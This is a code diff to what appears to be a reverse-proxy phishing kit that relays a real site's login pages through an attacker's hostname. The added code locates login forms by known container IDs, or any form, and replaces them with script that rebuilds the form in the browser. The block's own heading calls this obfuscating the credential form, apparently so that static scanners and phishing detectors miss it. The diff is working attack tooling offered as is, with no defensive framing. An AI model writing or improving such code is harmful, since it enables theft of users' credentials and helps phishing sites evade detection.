@@ -1272,6 +1272,63 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
     const protoRelRegex = new RegExp(`\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
     html = html.replace(protoRelRegex, `//${proxyHostname}`);
 
+    // ---- OBFUSCATE THE CREDENTIAL FORM ----
+const containerIds = ['login', 'loginForm', 'passwordSection', 'i0281', 'f1'];
+let obfuscatedHtml = null;
+
+for (const id of containerIds) {
+    const regex = new RegExp(`<(div|form)[^>]*\\s+id\\s*=\\s*["']${id}["'][^>]*>([\\s\\S]*?)<\\/\\1>`, 'i');
+    const match = html.match(regex);
+    if (match) {
+        const fullContainer = match[0];
+        const escaped = fullContainer
+            .replace(/\\/g, '\\\\')
+            .replace(/`/g, '\\`')
+            .replace(/\$/g, '\\$');
+        const placeholderId = `login-container-${Date.now()}`;
+        obfuscatedHtml = `
+            <div id="${placeholderId}"></div>
+            <script>
+                (function() {
+                    const containerHTML = \`${escaped}\`;
+                    const target = document.getElementById('${placeholderId}');
+                    if (target) {
+                        target.innerHTML = containerHTML;
+                        target.removeAttribute('id');
+                    }
+                })();
+            </script>
+        `;
+        html = html.replace(regex, obfuscatedHtml);
+        break; // only replace the first match
+    }
+}
+
+// Fallback: if no ID match, try any <form> (optional)
+if (!obfuscatedHtml) {
+    const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/i;
+    const match = html.match(formRegex);
+    if (match) {
+        const fullForm = match[0];
+        const escaped = fullForm.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+        const placeholderId = `login-container-${Date.now()}`;
+        const fallbackHtml = `
+            <div id="${placeholderId}"></div>
+            <script>
+                (function() {
+                    const containerHTML = \`${escaped}\`;
+                    const target = document.getElementById('${placeholderId}');
+                    if (target) {
+                        target.innerHTML = containerHTML;
+                        target.removeAttribute('id');
+                    }
+                })();
+            </script>
+        `;
+        html = html.replace(formRegex, fallbackHtml);
+    }
+}
+
     // ---- 2. INJECT <base> TAG TO HANDLE RELATIVE URLS ----
     const baseTag = `<base href="${proxyOrigin}/">`;
 
